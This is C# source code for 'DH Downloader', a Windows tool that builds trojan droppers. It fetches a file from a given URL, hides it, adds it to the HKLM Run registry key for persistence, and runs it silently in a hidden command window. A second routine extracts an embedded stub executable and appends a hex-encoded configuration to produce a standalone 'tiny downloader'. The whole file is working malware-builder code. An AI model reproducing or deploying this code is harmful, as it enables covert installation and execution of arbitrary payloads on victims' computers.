// DH Downloader 1.0
// (C) Doddy Hackman 2014
//
// Credits : 
//
// Based on : http://www.csharp-examples.net/download-files/
//
//

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

using System.Net;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;

using System.Reflection;

namespace DH_Downloader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string ruta_final_global = "";

        // Functions

        public string hexencode(string texto)
        {
            string resultado = "";

            byte[] enc = Encoding.Default.GetBytes(texto);
            resultado = BitConverter.ToString(enc);
            resultado = resultado.Replace("-", "");
            return "0x" + resultado;
        }

        public string hexdecode(string texto)
        {

            // Based on : http://snipplr.com/view/36461/string-to-hex----hex-to-string-convert/
            // Thanks to emregulcan

            string valor = texto.Replace("0x", "");
            string retorno = "";

            while (valor.Length > 0)
            {
                retorno = retorno + System.Convert.ToChar(System.Convert.ToUInt32(valor.Substring(0, 2), 16));
                valor = valor.Substring(2, valor.Length - 2);
            }

            return retorno.ToString();

        }

        public void cmd_normal(string command)
        {
            try
            {
                System.Diagnostics.Process.Start("cmd", "/c " + command);
            }
            catch
            {
                //
            }
        }

        public void cmd_hide(string command)
        {
            try
            {
                ProcessStartInfo cmd_now = new ProcessStartInfo("cmd", "/c " + command);
                cmd_now.RedirectStandardOutput = false;
                cmd_now.WindowStyle = ProcessWindowStyle.Hidden;
                cmd_now.UseShellExecute = true;
                Process.Start(cmd_now);
            }
            catch
            {
                //
            }
        }

        public void extraer_recurso(string name, string save)
        {

            // Based on : http://www.c-sharpcorner.com/uploadfile/40e97e/saving-an-embedded-file-in-C-Sharp/
            // Thanks to Jean Paul

            try
            {
                Stream bajando_recurso = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
                FileStream yacasi = new FileStream(save, FileMode.CreateNew);
                for (int count = 0; count < bajando_recurso.Length; count++)
                {
                    byte down = Convert.ToByte(bajando_recurso.ReadByte());
                    yacasi.WriteByte(down);
                }
                yacasi.Close();
            }
            catch
            {
                MessageBox.Show("Error unpacking resource");
            }

        }

        //

        private void mephobiaButton1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }


        private void mephobiaButton2_Click(object sender, EventArgs e)
        {

            string url = mephobiaTextBox1.Text;
            string directorio_final = "";
            string nombre_final = "";
            string ruta_final = "";

            string directorio_dondeestamos = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);

            if (mephobiaCheckBox1.Checked)
            {
                nombre_final = mephobiaTextBox2.Text;
            }
            else
            {
                nombre_final = Path.GetFileName(url);
            }

            if (mephobiaCheckBox2.Checked)
            {
                directorio_final = mephobiaTextBox3.Text;
            }
            else
            {
                directorio_final = directorio_dondeestamos;
            }

            ruta_final = directorio_final + "/" + nombre_final;
            ruta_final_global = ruta_final;
           
            //MessageBox.Show(directorio_final);
            //MessageBox.Show(nombre_final);
            //MessageBox.Show(ruta_final);

            Directory.SetCurrentDirectory(directorio_final);

            if (File.Exists(ruta_final))
            {
                File.Delete(ruta_final);
            }

            toolStripStatusLabel1.Text = "[+] Downloading ...";
            this.Refresh();

            try
            {
                WebClient nave = new WebClient();
                nave.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0";
                nave.DownloadFileCompleted += new AsyncCompletedEventHandler(finished);
                nave.DownloadProgressChanged += new DownloadProgressChangedEventHandler(ahi_vamos);
                nave.DownloadFileAsync(new Uri(url), nombre_final);
            }

            catch
            {
                //
            }
            

            if (mephobiaCheckBox3.Checked)
            {
                if (File.Exists(ruta_final))
                {
                    try
                    {
                        File.SetAttributes(ruta_final, FileAttributes.Hidden);
                    }
                    catch
                    {
                        //
                    }
                }
            }

            if (mephobiaCheckBox4.Checked)
            {
                if (File.Exists(ruta_final))
                {
                    try
                    {
                        RegistryKey loadnow = Registry.LocalMachine;
                        loadnow = loadnow.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        loadnow.SetValue("uberkz", ruta_final, RegistryValueKind.String);
                        loadnow.Close();
                    }
                    catch
                    {
                        //
                    }
                }
            }

            if (mephobiaCheckBox5.Checked)
            {
                if (mephobiaRadiobutton1.Checked)
                {
                    cmd_normal("\"" + ruta_final + "\"");
                }
                if (mephobiaRadiobutton2.Checked)
                {
                    cmd_hide("\"" + ruta_final + "\"");
                }

            }

        }

        private void ahi_vamos(object sender, DownloadProgressChangedEventArgs e)
        {
            toolStripProgressBar1.Value = e.ProgressPercentage;
        }

        private void finished(object sender, AsyncCompletedEventArgs e)
        {

            long tam = new System.IO.FileInfo(ruta_final_global).Length;

            if (File.Exists(ruta_final_global) && tam!=0 )
            {
                toolStripStatusLabel1.Text = "[+] Done";
                this.Refresh();
                MessageBox.Show("Downloaded");
            }
            else
            {
                toolStripStatusLabel1.Text = "[-] Error";
                this.Refresh();
                MessageBox.Show("Failed download");
            }
            toolStripProgressBar1.Value = 0;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            toolStripProgressBar1.Value = 0;
        }

        private void mephobiaButton3_Click(object sender, EventArgs e)
        {

            string linea_generada = "";

            string url = mephobiaTextBox4.Text;
            string opcion_change_name = "";
            string text_change_name = mephobiaTextBox5.Text;
            string opcion_carga_normal = "";
            string opcion_carga_hide = "";
            string ruta_donde_bajar = "";
            string opcion_ocultar_archivo = "";
            string opcion_startup = "";

            if (mephobiaCheckBox7.Checked)
            {
                opcion_change_name = "1";
            }
            else
            {
                opcion_change_name = "0";
            }

            if (mephobiaRadiobutton3.Checked)
            {
                opcion_carga_normal = "1";
            }
            else
            {
                opcion_carga_normal = "0";
            }

            if (mephobiaRadiobutton4.Checked)
            {
                opcion_carga_hide = "1";
            }
            else
            {
                opcion_carga_hide = "0";
            }

            if (mephobiaComboBox1.SelectedItem != null)
            {
                ruta_donde_bajar = mephobiaComboBox1.SelectedItem.ToString();
            }
            else
            {
                ruta_donde_bajar = "Fuck You Bitch";
            }

            if (mephobiaCheckBox6.Checked)
            {
                opcion_ocultar_archivo = "1";
            }
            else
            {
                opcion_ocultar_archivo = "0";
            }

            if (mephobiaCheckBox8.Checked)
            {
                opcion_startup = "1";
            }
            else
            {
                opcion_startup = "0";
            }

            extraer_recurso("DH_Downloader.Resources.stub.exe", "stub.exe");

            string check_stub = AppDomain.CurrentDomain.BaseDirectory + "/stub.exe";
            string work_on_stub = AppDomain.CurrentDomain.BaseDirectory + "/done.exe";

            if (File.Exists(check_stub))
            {

                if (File.Exists(work_on_stub))
                {
                    System.IO.File.Delete(work_on_stub);
                }

                System.IO.File.Copy(check_stub, work_on_stub);

                linea_generada = "-url-" + url + "-url-" + "-opcion_change_name-" + opcion_change_name + "-opcion_change_name-" +
                "-text_change_name-" + text_change_name + "-text_change_name-" + "-opcion_carga_normal-" +
                opcion_carga_normal + "-opcion_carga_normal-" + "-opcion_carga_hide-" + opcion_carga_hide +
                "-opcion_carga_hide-" + "-ruta_donde_bajar-" + ruta_donde_bajar + "-ruta_donde_bajar-" +
                "-opcion_ocultar_archivo-" + opcion_ocultar_archivo + "-opcion_ocultar_archivo-"+"-opcion_startup-"+
                opcion_startup+"-opcion_startup-";

                string generado = hexencode(linea_generada);
                string linea_final = "-63686175-" + generado + "-63686175-";

                FileStream abriendo = new FileStream(work_on_stub, FileMode.Append);
                BinaryWriter seteando = new BinaryWriter(abriendo);
                seteando.Write(linea_final);
                seteando.Flush();
                seteando.Close();
                abriendo.Close();

                //MessageBox.Show(generado);
                //MessageBox.Show(hexdecode(generado));

                try
                {
                    System.IO.File.Delete(check_stub);
                }
                catch
                {
                    //
                }

                MessageBox.Show("Tiny downloader Generated");

            }
            else
            {
                MessageBox.Show("Stub not found");
            }

        }
    }
}

// The End ?